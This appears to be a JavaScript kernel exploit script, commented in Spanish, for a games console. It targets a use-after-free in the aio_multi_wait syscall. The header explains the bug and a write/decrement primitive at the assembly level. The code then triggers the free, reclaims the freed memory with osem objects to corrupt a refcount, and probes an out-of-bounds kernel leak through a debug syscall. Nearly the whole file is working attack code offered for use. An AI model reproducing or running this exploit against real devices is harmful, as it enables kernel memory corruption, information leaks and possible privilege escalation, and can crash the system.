// bagagwa_uaf_1320.js — BAGAGWA multi-chain: fase UAF determinista (mode 0).
// Spec: "Bagagwa Multi Chain Exploit" (AIO multi_wait mode 0 + leak 727 + osem).
//
// IDEA DEL BUG (syscall 663 = aio_multi_wait, body 0x805c0210):
//   El array de waiters se cachea en [rbx+0x40] y se recorre con add r14,0x38.
//   Con num>=2 y mode 0, el dispatch (0x805c08e5) hace rcx = [rbx+0x40] SIN
//   indexar: enlaza SIEMPRE el mismo nodo (elemento 0) en las listas de las N
//   requests, sobreescribiendo node->owner (+0x18) en cada iteracion. El
//   cleanup (0x805c0da1) desenlaza por node->owner -> solo lo quita de la
//   ULTIMA request; al liberar el array (0x805c0f93) las requests 0..N-2
//   conservan req->waiters apuntando a memoria liberada (UAF).
//
//   El waker (0x805c1d2d) es el primitivo de escritura:
//     mov [r15+0x20], eax      ; write 32-bit controlado
//     mov rdi,[r15+0x10]; +0x18; mtx_lock  ; lock sobre puntero controlado
//     mov rax,[r15]
//     dec [rax]                ; decremento 32-bit arbitrario #1
//     mov rax,[r15+8]
//     test rax,rax / dec [rax] ; decremento #2 (mode 0 lo deja M_ZERO -> libre)
//
// ABI real (confirmado en lapse.js y osem2_1320.js):
//   aio_multi_wait(ids*, num_ids, states*, mode, timeout)   [0x297]
//   aio_submit_cmd(cmd, reqs*, num_reqs, priority, ids*)    [0x29D]
//   aio_multi_poll(ids*, num_ids, states*)                  [0x298]
//   aio_multi_cancel(ids*, num_ids, states*)                [0x29A]
//   aio_multi_delete(ids*, num_ids, states*)                [0x296]
//   get_aio_debug_request_info(req_id, out*)                [0x2D7]
//   osem_create(name*, attr, init, max, opt*)               [0x225]
//   osem_delete(id)                                         [0x226]
//   osem_open(name*, flags)                                 [0x227]
//   AIO_CMD_MULTI_READ = 0x1001
//
// FASES:
//   0  ABI: familia AIO responde (si ENOSYS total -> abortar, no hay cadena)
//   1  crear N requests AIO validas (submit multi-read) -> ids vivas
//   2  preparar la request objetivo + nodo de control en heap propio
//   3  DISPARO: aio_multi_wait(ids, N, states, mode=0, timeout=0)
//   4  post-UAF: re-crear con osem en la zona liberada (0x60 -> 128)
//   5  leak 0x2D7 (req_id con high16<0x80) hacia el buffer
//   6  veredicto + limpieza
//
// Logging: log() del bridge -> #scr + panel + log remoto.
// DESTRUCTIVO: fase 3+ puede colgar/panicar. Se para en la ultima W visible.
(() => {
    const B = (x) => BigInt(x), I = (x) => BigInt.asIntN(64, x);
    const Y = 331n; // sched_yield

    const say = (s) => { try { log("[bagagwa] " + s); } catch (e) {} };
    const notif = (s) => { try { send_notification(("[bagagwa] " + s).slice(0, 120)); } catch (e) {} };
    const EN = () => { try { const m = /^(\d+)/.exec(get_error_string()); return m ? parseInt(m[1], 10) : -1; } catch (e) { return -1; } };
    const EL = { 1: "EPERM", 2: "ENOENT", 3: "ESRCH", 9: "EBADF", 12: "ENOMEM", 14: "EFAULT",
        16: "EBUSY", 17: "EEXIST", 22: "EINVAL", 35: "EAGAIN", 78: "ENOSYS", 93: "ENOTCAPABLE" };
    const J = (e) => " errno=" + e + "(" + (EL[e] || "?") + ")";
    const FX = (v) => "0x" + B(v).toString(16);
    const HX = (b, n) => { let x = ""; for (let i = 0; i < n; i++) { const v = Number(read8(b + BigInt(i))) & 255; x += (v < 16 ? "0" : "") + v.toString(16) + " "; } return x; };
    const VS = (q) => q.ex ? "EX(" + q.msg + ")" : (q.r >= 0n ? "ok0x" + q.r.toString(16) : "e" + q.e + (EL[q.e] ? "(" + EL[q.e] + ")" : ""));
    const VIVA = (q) => !q.ex && !(q.r === -1n && q.e === 78);

    const SC = (tag, sc, args, desc) => {
        const p = tag + (desc ? " " + desc : "") + " (" + args.map(FX).join(",") + ")";
        say(p + " ...");
        const o = { tag, r: -9999n, e: -1, ex: false, msg: "" };
        try { o.r = I(syscall(sc, ...args.map((a) => B(a)))); if (o.r < 0n) o.e = EN(); }
        catch (err) { o.ex = true; o.msg = String(err && err.message || err).slice(0, 60); say(p + " -> THREW " + o.msg); return o; }
        say(p + " -> " + (o.r >= 0n ? "ret=0x" + o.r.toString(16) + " OK" : o.r + J(o.e)));
        return o;
    };

    // ABI
    const A_INIT = 0x29En, A_CREATE = 0x29Cn, A_SUBMIT = 0x295n, A_SUBCMD = 0x29Dn;
    const A_WAIT = 0x297n, A_POLL = 0x298n, A_CANCEL = 0x29An, A_DEL = 0x296n;
    const A_GET = 0x299n, A_DEBUG = 0x2D7n;
    const S_OSEM_CR = 0x225n, S_OSEM_DL = 0x226n, S_OSEM_OP = 0x227n;
    const AIO_CMD_MULTI_READ = 0x1001n;

    // Numero de requests. La spec: num>=2, mode 0 -> se enlazan todas al nodo 0.
    const NREQ = 2;
    const NODE_BYTES = 0x38;   // tamaño de nodo waiter
    const REQ_BYTES = 0x28;    // tamaño de request (lapse make_reqs1)

    say("begin - Bagagwa UAF (aio_multi_wait mode 0) pid=" + I(syscall(SYSCALL.getpid))
        + " fw=" + (PS5.fw || "?") + " mode=" + (PS5.mode || "?"));

    // ===== FASE 0: la familia AIO responde =====
    say("F0: ABI check familia AIO");
    const qInit = SC("AIO_INIT_0x29e", A_INIT, [0n], "(flags=0)");
    const qSubmit = SC("AIO_SUBMIT_0x295", A_SUBMIT, [0n, 0n, 0n], "(0,0,0)");
    const qWait = SC("AIO_WAIT_0x297", A_WAIT, [0n, 0n, 0n, 0n, 0n], "(0,0,0,mode0,0)");
    const qDebug = SC("AIO_DEBUG_0x2d7", A_DEBUG, [1n, 0n], "(1,NULL)");
    say("F0 gate: init=" + VS(qInit) + " submit=" + VS(qSubmit) + " wait=" + VS(qWait) + " debug=" + VS(qDebug));
    if (!VIVA(qInit) && !VIVA(qSubmit) && !VIVA(qWait)) {
        say("VERDICT: AIO MUERTA (ENOSYS total) -> Bagagwa no alcanzable; abortar sin disparar.");
        notif("bagagwa: AIO muerta, cadena no alcanzable");
        return;
    }

    // ===== FASE 1: crear N requests AIO validas =====
    // reqs[i] layout (lapse): [{+0x20} = fd/objetivo]. Los ids los devuelve
    // aio_submit_cmd en ids[i] (4 bytes c/u), con flag MULTI.
    say("F1: crear " + NREQ + " requests AIO (multi-read)");
    const reqs = malloc(REQ_BYTES * NREQ);
    for (let i = 0; i < NREQ; i++) write32(reqs + BigInt(i * REQ_BYTES + 0x20), 0n);
    const ids = malloc(4 * NREQ);
    for (let i = 0; i < NREQ; i++) write32(ids + BigInt(i * 4), 0n);
    const states = malloc(4 * NREQ);
    for (let i = 0; i < NREQ; i++) write32(states + BigInt(i * 4), 0n);

    const sub = SC("AIO_SUBMIT_CMD", A_SUBCMD,
        [AIO_CMD_MULTI_READ, reqs, B(NREQ), 3n, ids], "(MULTI_READ,reqs," + NREQ + ",prio3,ids)");
    const idList = [];
    for (let i = 0; i < NREQ; i++) {
        const r = Number(read32(ids + BigInt(i * 4)));
        idList.push(r);
        say("F1 id[" + i + "] = " + FX(r));
    }
    say("F1 submit=" + VS(sub) + " ids=" + idList.map(FX).join(","));

    // ===== FASE 2: nodo de control en heap propio =====
    // mode 0 no inicializa node->[8]; queda M_ZERO y es controlable post-free.
    // Preparamos un nodo con la forma del waker:
    //   +0x00 [rax] -> destino del dec #1
    //   +0x08 [rax] -> destino del dec #2 (si != 0)
    //   +0x10 rdi   -> puntero para mtx_lock (+0x18)
    //   +0x20 eax   -> write 32-bit
    say("F2: preparar nodo de control (0x" + NODE_BYTES.toString(16) + "B)");
    const node = malloc(NODE_BYTES);
    const decTarget1 = malloc(8);
    const decTarget2 = malloc(8);
    write64(decTarget1, 0x4141414141414141n);
    write64(decTarget2, 0x4242424242424242n);
    write64(node + 0x00n, decTarget1);
    write64(node + 0x08n, decTarget2);
    write64(node + 0x10n, 0n);          // mtx_lock ptr: 0 = no-op seguro
    write32(node + 0x20n, 0x13371337n);
    say("F2 node=" + FX(node) + " dec1=" + FX(decTarget1) + " dec2=" + FX(decTarget2));
    say("F2 pre: dec1=" + FX(read64(decTarget1)) + " dec2=" + FX(read64(decTarget2)));

    // ===== FASE 3: DISPARO UAF =====
    // aio_multi_wait(ids, NREQ, states, mode=0, timeout=0). Con mode 0 y num>=2
    // el mismo nodo se enlaza N veces. timeout=0 => no bloquea (a diferencia de
    // mode 1 que espera).
    say("F3: DISPARO aio_multi_wait(ids," + NREQ + ",states,mode=0,timeout=0)");
    notif("bagagwa: disparando aio_multi_wait mode 0");
    const det = SC("AIO_WAIT_MODE0", A_WAIT, [ids, B(NREQ), states, 0n, 0n], "(ids,N,states,mode0,0)");
    say("F3 resultado: " + VS(det) + "  <- si la consola sigue viva, el UAF no ha hecho panic");
    for (let i = 0; i < 200; i++) { try { syscall(Y); } catch (e) {} }

    // ===== FASE 4: reclamo de la zona liberada con osem =====
    // El array de waiters se libera; osem_create hace malloc(0x60) = 128 zone.
    // Si reutiliza esa zona, el nodo colgante apunta dentro del objeto osem.
    say("F4: reclamar zona liberada (osem_create 0x60 -> 128 zone)");
    const oseName = alloc_string("baga0");
    const qo1 = SC("OSEM_CREATE", S_OSEM_CR, [oseName, 0n, 1n, 1n, 0n], "(baga0,0,1,1,0)");
    const qo2 = SC("OSEM_CREATE", S_OSEM_CR, [alloc_string("baga1"), 0n, 1n, 1n, 0n], "(baga1,0,1,1,0)");
    say("F4 osem ids: " + VS(qo1) + " / " + VS(qo2));
    if (qo1.r >= 0n) {
        // El refcount osem esta en obj+0x54 (32-bit). Si el dec #1/#2 del waker
        // cae ahi, decrementa el refcount -> objeto liberable con refs vivas.
        say("F4 nota: refcount objetivo en obj[0x54]; dec waker #1 en [node]= " + FX(decTarget1));
    }
    for (let i = 0; i < 200; i++) { try { syscall(Y); } catch (e) {} }

    // ===== FASE 5: leak 0x2D7 =====
    // req_id acotado a [1, table->0x228]; el loop de copia indexa con
    // (req_id>>16) como bias en otro array -> OOB si req_id>>16 < 0x80.
    say("F5: leak get_aio_debug_request_info(0x2D7)");
    const LB = malloc(0x80);
    for (let i = 0n; i < 0x80n; i += 8n) write64(LB + i, 0xDEADBEEF00000000n + i);
    const leaks = [];
    for (const rid of [1n, 2n, 3n, 0x228n, 0x10001n, 0x20001n, 0x40001n, 0x7F0001n]) {
        const q = SC("LEAK_0x2D7", A_DEBUG, [rid, LB], "(req_id=" + FX(rid) + ",buf)");
        let changed = false;
        try {
            for (let i = 0n; i < 0x80n; i += 8n)
                if (read64(LB + i) !== 0xDEADBEEF00000000n + i) changed = true;
        } catch (e) {}
        leaks.push(FX(rid) + "=" + VS(q) + (changed ? "+WROTE" : "+no"));
        if (changed) say("F5 leak contenido: " + HX(LB, 0x40));
    }
    say("F5 sum: " + leaks.join(" "));

    // ===== FASE 6: veredicto + limpieza =====
    say("F6: limpieza (multi_cancel/delete, osem_delete)");
    const can = SC("AIO_MULTI_CANCEL", A_CANCEL, [ids, B(NREQ), states], "(ids,N,states)");
    const del = SC("AIO_MULTI_DELETE", A_DEL, [ids, B(NREQ), states], "(ids,N,states)");
    if (qo1.r >= 0n) SC("OSEM_DELETE", S_OSEM_DL, [qo1.r], "(id)");
    if (qo2.r >= 0n) SC("OSEM_DELETE", S_OSEM_DL, [qo2.r], "(id)");

    const post1 = read64(decTarget1), post2 = read64(decTarget2);
    let v;
    if (det.ex) v = "FALLO: aio_multi_wait mode0 THREW (" + det.msg + ")";
    else if (det.r < 0n && det.e === 78) v = "aio_multi_wait ENOSYS -> no existe en este sandbox";
    else if (post1 !== 0x4141414141414141n || post2 !== 0x4242424242424242n)
        v = "PRIMITIVO VIVO: dec alcanzo el objetivo (dec1=" + FX(post1) + " dec2=" + FX(post2) + ")";
    else v = "mode0 retorno " + VS(det) + " sin tocar los objetivos (nodo no usado o sin waker)";
    say("VERDICT: " + v);
    notif(("bagagwa: " + v).slice(0, 120));
    for (let i = 0; i < 8; i++) { notif(("bagagwa: " + v).slice(0, 100)); for (let j = 0; j < 1000; j++) { try { syscall(Y); } catch (e) {} } }
    say("PAYLOAD DONE");
})();